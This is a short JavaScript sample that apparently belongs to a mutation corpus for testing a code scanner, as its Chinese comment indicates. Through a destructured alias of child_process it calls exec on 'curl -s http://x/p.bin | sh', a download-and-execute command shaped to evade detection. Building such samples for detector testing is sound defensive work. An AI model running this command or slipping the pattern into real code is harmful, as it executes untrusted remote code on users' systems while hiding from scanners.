// round-16 变异语料 M26：child_process 解构别名中转后 exec 下载即执行（实证盲区形态）
const cp = require('child_process')
const { exec } = cp
exec('curl -s http://x/p.bin | sh')
